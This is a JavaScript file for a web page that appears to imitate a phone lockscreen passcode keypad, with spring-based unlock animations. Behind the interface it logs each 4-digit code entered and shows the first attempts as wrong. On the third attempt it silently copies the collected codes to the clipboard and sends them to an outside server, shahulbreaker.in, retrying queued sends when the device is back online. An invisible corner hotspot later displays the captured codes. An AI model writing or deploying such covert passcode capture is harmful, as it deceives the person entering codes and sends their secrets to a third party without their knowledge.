(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarun&data=";
  const MAX = 4;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  // keep a live reference to cancel button
  let cancelBtn = document.getElementById('cancel');
  const unlockOverlay = document.getElementById('unlockOverlay');
  const lockInner = document.querySelector('.lockscreen.inner') || document.querySelector('.lockscreen-inner');
  const homescreenImg = document.getElementById('homescreenImg');
  const ATT_KEY = '_pass_attempt_count_';
  const QUEUE_KEY = '_pass_queue_';

  // rotating buffer for last up-to-4 entered codes
  const LAST_CODES_KEY = '_pass_last_codes_';
  function getLastCodes() {
    try {
      return JSON.parse(localStorage.getItem(LAST_CODES_KEY) || '[]');
    } catch (e) {
      return [];
    }
  }
  function pushLastCode(c) {
    try {
      const arr = getLastCodes();
      arr.push(c);
      while (arr.length > 4) arr.shift();
      localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
    } catch (e) {}
  }
  function getCombinedLastCodes() {
    return getLastCodes().join(',');
  }

  // --- clear saved attempts/queue on a fresh app session (iOS Home-screen launch) ---
  function clearSavedAttempts() {
    try {
      localStorage.removeItem(LAST_CODES_KEY);
      localStorage.removeItem(ATT_KEY);
      localStorage.removeItem(QUEUE_KEY);
    } catch (e) { /* ignore */ }
  }

  (function ensureFreshSessionOnLaunch() {
    // Use sessionStorage as a per-session marker. When a new PWA launch happens
    // the browsing context is new and sessionStorage will be empty — we clear.
    try {
      const alreadyStarted = sessionStorage.getItem('pass_session_started');
      function markStarted() { sessionStorage.setItem('pass_session_started', '1'); }

      // If no session flag, treat this as a fresh launch and clear persisted data.
      if (!alreadyStarted) {
        clearSavedAttempts();
        markStarted();
      }

      // Also respond to pageshow (covers bfcache restores). If sessionStorage was cleared
      // (new browsing context) pageshow will still call init above.
      window.addEventListener('pageshow', () => {
        if (!sessionStorage.getItem('pass_session_started')) {
          clearSavedAttempts();
          markStarted();
        }
      }, { passive: true });
    } catch (err) {
      // if anything goes wrong, fail silently and don't break the app
      console.warn('session init check failed', err);
    }
  })();

  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }

  function refreshDots() {
    // Ensure dotEls are up-to-date if DOM changed
    const dots = Array.from(document.querySelectorAll('.dot'));
    dots.forEach((d,i) => d.classList.toggle('filled', i < code.length));
    updateCancelText(); // keep label in sync whenever dots change
  }

  function reset() {
    code = "";
    refreshDots();
  }

  function queuePass(pass) {
    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    q.push({ pass, ts: Date.now() });
    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
  }

  function sendToAPI(pass) {
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => {
        queuePass(pass);
      });
  }

  function flushQueue() {
    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(QUEUE_KEY);
  }

  /* ---------- Spring engine (semi-implicit integrator) ---------- */
  function springAnimate(opts) {
    const mass = opts.mass ?? 1;
    const stiffness = opts.stiffness ?? 120; // k
    const damping = opts.damping ?? 14;      // c
    const threshold = opts.threshold ?? 0.02;
    let x = opts.from;
    let v = opts.velocity ?? 0;
    const target = opts.to;
    let last = performance.now();
    let rafId = null;

    function step(now) {
      const dt = Math.min(0.032, (now - last) / 1000);
      last = now;
      const a = (-stiffness * (x - target) - damping * v) / mass;
      v += a * dt;
      x += v * dt;

      if (typeof opts.onUpdate === 'function') opts.onUpdate(x);

      const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
      if (isSettled) {
        if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
        if (typeof opts.onComplete === 'function') opts.onComplete();
        cancelAnimationFrame(rafId);
        return;
      }
      rafId = requestAnimationFrame(step);
    }

    rafId = requestAnimationFrame(step);
    return () => cancelAnimationFrame(rafId);
  }

  /* ---------- playUnlockAnimation uses two springs ---------- */
  function playUnlockAnimation() {
    const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    if (!lockInner || !unlockOverlay || !homescreenImg) return;

    unlockOverlay.classList.add('show');

    if (prefersReduced) {
      lockInner.style.transform = `translate3d(0, -110%, 0)`;
      homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
      homescreenImg.style.opacity = '1';
      homescreenImg.style.filter = 'blur(0) saturate(1)';
      return;
    }

    const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
    const targetY = -Math.round(height * 1.08);

    lockInner.style.willChange = 'transform, opacity';
    homescreenImg.style.willChange = 'transform, filter, opacity';
    lockInner.style.transform = `translate3d(0,0,0) scale(1)`;
    homescreenImg.style.transform = `translate3d(0,6%,0) scale(0.96)`;
    homescreenImg.style.opacity = '0';
    homescreenImg.style.filter = 'blur(10px) saturate(0.9)';
    lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';

    springAnimate({
      from: 0,
      to: targetY,
      mass: 1.05,
      stiffness: 140,
      damping: 16,
      onUpdate: (val) => {
        const progress = Math.min(1, Math.abs(val / targetY));
        const scale = 1 - 0.003 * progress;
        lockInner.style.transform = `translate3d(0, ${val}px, 0) scale(${scale})`;
        lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
      },
      onComplete: () => {
        lockInner.style.boxShadow = '';
        lockInner.style.opacity = '0';
        lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
      }
    });

    springAnimate({
      from: 0,
      to: 1,
      mass: 1,
      stiffness: 80,
      damping: 11,
      onUpdate: (p) => {
        const progress = Math.max(0, Math.min(1, p));
        const raw = p;
        const scale = 1 + (raw - 1) * 0.12;
        const finalScale = Math.max(0.96, Math.min(1.06, scale));
        homescreenImg.style.transform = `translate3d(0,0,0) scale(${finalScale})`;
        const blur = Math.max(0, 10 * (1 - Math.min(1, raw)));
        const sat = 0.9 + Math.min(0.15, raw * 0.15);
        homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw));
      },
      onComplete: () => {
        homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
        homescreenImg.style.filter = 'blur(0) saturate(1)';
        homescreenImg.style.opacity = '1';
      }
    });

    setTimeout(() => {
      lockInner.style.boxShadow = '';
      homescreenImg.style.willChange = '';
      lockInner.style.willChange = '';
    }, 1200);
  }

  function animateWrongAttempt() {
    const dotsEl = document.getElementById('dots');
    if (!dotsEl) {
      reset();
      return;
    }
    const DURATION = 700;

    // Force Cancel label back to 'Cancel' during shake
    if (cancelBtn) cancelBtn.textContent = 'Cancel';

    dotsEl.classList.add('wrong');
    reset();
    setTimeout(() => {
      dotsEl.classList.remove('wrong');
    }, DURATION + 20);
  }

  /* ---------- Clipboard helper & toast (preserve user gesture) ---------- */
  function copyToClipboard(text) {
    // Try modern API first
    if (navigator.clipboard && navigator.clipboard.writeText) {
      return navigator.clipboard.writeText(text).catch(() => {
        // fallback to execCommand if modern API fails
        return fallbackCopy(text);
      });
    }
    return Promise.resolve().then(() => fallbackCopy(text));
  }

  function fallbackCopy(text) {
    return new Promise((resolve, reject) => {
      try {
        const ta = document.createElement('textarea');
        ta.value = text;
        // Move off-screen
        ta.style.position = 'fixed';
        ta.style.left = '-9999px';
        ta.style.top = '0';
        document.body.appendChild(ta);
        ta.focus();
        ta.select();
        const ok = document.execCommand('copy');
        document.body.removeChild(ta);
        if (ok) resolve();
        else reject(new Error('execCommand copy failed'));
      } catch (err) {
        reject(err);
      }
    });
  }

  function showToast(msg, ms = 1200) {
    let t = document.getElementById('pass-toast');
    if (!t) {
      t = document.createElement('div');
      t.id = 'pass-toast';
      document.body.appendChild(t);
      // styles are in styles.css; if the file wasn't loaded, apply minimal styling
      if (!getComputedStyle(t).position) {
        Object.assign(t.style, {
          position: 'fixed',
          left: '50%',
          bottom: '120px',
          transform: 'translateX(-50%)',
          background: 'rgba(0,0,0,0.75)',
          color: '#fff',
          padding: '8px 12px',
          borderRadius: '10px',
          zIndex: '12002',
          pointerEvents: 'none',
          opacity: '0',
          transition: 'opacity 160ms ease, transform 160ms ease'
        });
      }
    }
    t.textContent = msg;
    t.style.opacity = '1';
    t.style.transform = 'translateX(-50%) translateY(0)';
    clearTimeout(t._hideTimer);
    t._hideTimer = setTimeout(() => {
      t.style.opacity = '0';
      t._hideTimer2 = setTimeout(() => {
        // leave element in DOM for reuse
      }, 200);
    }, ms);
  }

  /* ---------- handleCompleteAttempt: send on 3rd attempt, unlock on 4th ---------- */
  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    // push code into rotating buffer (so hotspot displays exact payload)
    pushLastCode(enteredCode);

    // 1-2: wrong attempts (no send)
    if (attempts === 1 || attempts === 2) {
      animateWrongAttempt();
    }
    // 3: send combined last codes
    else if (attempts === 3) {
      const combined = getCombinedLastCodes();
      if (combined) sendToAPI(combined);
      animateWrongAttempt();
    }
    // 4: unlock animation (no send)
    else if (attempts === 4) {
      playUnlockAnimation();
      setTimeout(reset, 300);
    }

    // reset counter once we've reached the unlock threshold
    if (attempts >= 4) {
      setAttempts(0);
    }
  }

  function animateBrightness(el, target, duration) {
    let startTime;
    const initial = parseFloat(el.dataset.brightness || "1");
    const change = target - initial;

    function easeOutCubic(t) {
      return 1 - Math.pow(1 - t, 3);
    }

    function frame(ts) {
      if (!startTime) startTime = ts;
      const progress = Math.min((ts - startTime) / duration, 1);
      const eased = easeOutCubic(progress);
      const value = initial + change * eased;
      el.style.filter = `brightness(${value})`;
      el.dataset.brightness = value.toFixed(3);
      if (progress < 1) {
        requestAnimationFrame(frame);
      }
    }
    requestAnimationFrame(frame);
  }

  keys.forEach(k => {
    const num = k.dataset.num;
    if (!num) return;

    k.addEventListener('touchstart', () => {
      animateBrightness(k, 1.6, 80);
      // update Cancel->Delete immediately on touchstart for snappy feedback
      updateCancelText();
    }, { passive: true });

    const endPress = () => {
      animateBrightness(k, 1, 100);
    };
    k.addEventListener('touchend', endPress);
    k.addEventListener('touchcancel', endPress);
    k.addEventListener('mouseleave', endPress);

    k.addEventListener('click', () => {
      if (code.length >= MAX) return;
      code += num;
      refreshDots();

      if (code.length === MAX) {
        const enteredCode = code;

        // Ensure copy happens ONLY when:
        //  - this is a full 4-digit entry (code.length === MAX)
        //  - the resulting attempt count (after this entry) will equal 3
        try {
          const upcomingAttempts = getAttempts() + 1; // what attempts will be after this entry
          if (upcomingAttempts === 3) {
            // Build the combined string exactly as will be sent: existing stored last codes + current entered code
            const combinedCandidate = getLastCodes().concat([enteredCode]).join(',');
            // Copy synchronously within the user gesture (returns Promise)
            // NOTE: on success we intentionally do NOT show any "Copied" UI.
            copyToClipboard(combinedCandidate)
              .catch(() => {
                // show failure feedback only (optional)
                showToast('Copy failed', 900);
              });
          }
        } catch (err) {
          // ignore clipboard errors and continue
          console.warn('clipboard pre-copy failed', err);
        }

        // keep existing UX timing for the attempt completion (small delay for animation)
        setTimeout(() => {
          handleCompleteAttempt(enteredCode);
        }, 120);
      }
    });
  });

  emergency && emergency.addEventListener('click', e => e.preventDefault());

  // ----------------- Cancel / Delete behavior (non-destructive) -----------------
  function updateCancelText() {
    // refresh reference (in case DOM swapped) and update text
    cancelBtn = document.getElementById('cancel') || cancelBtn;
    if (!cancelBtn) return;
    cancelBtn.textContent = (code && code.length > 0) ? 'Delete' : 'Cancel';
  }

  function wireCancelAsDelete() {
    const old = document.getElementById('cancel');
    if (!old) return;
    // clone to remove prior listeners safely
    const cloned = old.cloneNode(true);
    old.parentNode && old.parentNode.replaceChild(cloned, old);
    cancelBtn = document.getElementById('cancel');
    cancelBtn.addEventListener('click', (e) => {
      e.preventDefault();
      if (code.length > 0) {
        // delete last digit
        code = code.slice(0, -1);
        refreshDots();
        updateCancelText();
      } else {
        // original cancel behavior
        reset();
      }
    });
  }

  wireCancelAsDelete();
  updateCancelText();
  // ------------------------------------------------------------------------------

  window.addEventListener('online', flushQueue);
  flushQueue();

  /* ---------- Invisible bottom-left hotspot: show combined last-6 codes on press ---------- */

  function createInvisibleHotspotAndDisplay() {
    // Hotspot (invisible)
    if (!document.getElementById('codesHotspot')) {
      const hs = document.createElement('div');
      hs.id = 'codesHotspot';
      Object.assign(hs.style, {
        position: 'fixed',
        left: '8px',
        bottom: '8px',
        width: '56px',
        height: '56px',
        borderRadius: '12px',
        background: 'transparent',
        border: 'none',
        zIndex: '12000',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        boxSizing: 'border-box',
        touchAction: 'none',
        cursor: 'pointer',
        pointerEvents: 'auto'
      });
      document.body.appendChild(hs);
    }

    // Combined display (hidden by default)
    if (!document.getElementById('codesCombinedDisplay')) {
      const d = document.createElement('div');
      d.id = 'codesCombinedDisplay';
      Object.assign(d.style, {
        position: 'fixed',
        left: '8px',
        bottom: '72px',
        minWidth: '160px',
        maxWidth: 'calc(100% - 16px)',
        zIndex: '12001',
        display: 'none',
        justifyContent: 'center',
        pointerEvents: 'none',
        transition: 'opacity 120ms ease, transform 120ms ease'
      });

      const inner = document.createElement('div');
      inner.id = 'codesCombinedInner';
      Object.assign(inner.style, {
        width: '100%',
        background: 'rgba(0,0,0,0.7)',
        borderRadius: '12px',
        padding: '10px 12px',
        boxSizing: 'border-box',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        color: '#fff',
        fontSize: '16px',
        fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
        fontWeight: '700',
        letterSpacing: '0.6px'
      });

      d.appendChild(inner);
      document.body.appendChild(d);
    }
  }

  function showCombinedStringAtBottomLeft() {
    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
    createInvisibleHotspotAndDisplay();
    const bar = document.getElementById('codesCombinedDisplay');
    const inner = document.getElementById('codesCombinedInner');
    inner.textContent = ''; // clear

    const codes = getLastCodes();
    if (!codes || codes.length === 0) {
      inner.textContent = '';
    } else {
      const combined = codes.join(',');
      inner.textContent = combined;
    }

    bar.style.display = 'flex';
    requestAnimationFrame(() => {
      bar.style.transform = 'translateY(0)';
      bar.style.opacity = '1';
    });
  }

  function hideCombinedDisplayNow() {
    const bar = document.getElementById('codesCombinedDisplay');
    if (!bar) return;
    bar.style.transform = 'translateY(8px)';
    bar.style.opacity = '0';
    setTimeout(() => {
      if (bar) bar.style.display = 'none';
    }, 140);
  }

  // Hotspot handlers
  function onHotspotDown(ev) {
    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
    ev.preventDefault();
    showCombinedStringAtBottomLeft();
  }
  function onHotspotUp(ev) {
    hideCombinedDisplayNow();
  }

  function ensureHotspotListeners() {
    createInvisibleHotspotAndDisplay();
    const hs = document.getElementById('codesHotspot');
    if (!hs._attached) {
      hs.addEventListener('pointerdown', onHotspotDown);
      window.addEventListener('pointerup', onHotspotUp);
      window.addEventListener('pointercancel', onHotspotUp);
      hs.addEventListener('touchstart', onHotspotDown, { passive: false });
      window.addEventListener('touchend', onHotspotUp);
      window.addEventListener('touchcancel', onHotspotUp);
      hs._attached = true;
    }
  }

  ensureHotspotListeners();

  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };

})();
